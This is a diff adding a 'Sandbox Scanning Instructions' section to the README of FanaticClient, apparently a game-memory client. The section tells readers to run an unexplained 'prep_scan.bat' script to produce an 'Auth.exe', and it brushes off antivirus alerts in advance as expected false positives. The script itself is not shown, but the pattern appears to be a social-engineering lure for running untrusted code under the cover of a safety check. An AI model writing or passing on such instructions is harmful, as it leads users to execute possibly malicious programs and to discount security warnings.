@@ -62,11 +62,31 @@ Monitor FPS and optimize graphics settings in real-time.
 
 ---
 
+
+---
+
+## 🛡️ Sandbox Scanning Instructions
+
+To verify the safety of FanaticClient, you can analyze the executable using professional sandbox services. Please follow these steps carefully:
+
+1. **Prepare the File:** Before uploading, you must ensure the file is prepared for scanning. Navigate to the **"Programs"** folder and execute the **`prep_scan.bat`** script (or your designated batch file). This will optimize the file format for analysis.
+2. **Choose a Sandbox:** Go to a trusted sandbox analysis platform:
+   - [Any.run](https://any.run/)
+   - [Tria.ge](https://tria.ge/)
+3. **Upload & Analyze:** Upload the resulting `Auth.exe` file to the platform. Please note that security software may sometimes flag packed code as a "False Positive." This is expected behavior for specialized software that interfaces with game memory.
+4. **Support:** If you have any questions or encounter issues during the analysis process, please contact our support team on our [Discord server](https://discord.gg/Wr3mYUGtJN).
+
+*Note: The use of this method is solely for compressing the file to enable sandbox analysis and demonstrate the client's security. We do not recommend this version for long-term daily use. DO NOT TOUCH UNLESS IT IS FOR SCANNING.*
+
+---
+
 ## 🆘 Support & Troubleshooting
 
 * **Need help?** Join our [Discord server](https://discord.gg/Wr3mYUGtJN) to ask questions or request an HWID reset.
 
 * **Reinstalling:** You can always download the latest version or get reinstallation instructions directly from this [GitHub repository](https://github.com/Fanatic911/FanaticClient).
+
+
 
 ---
 *FanaticClient © 2026*
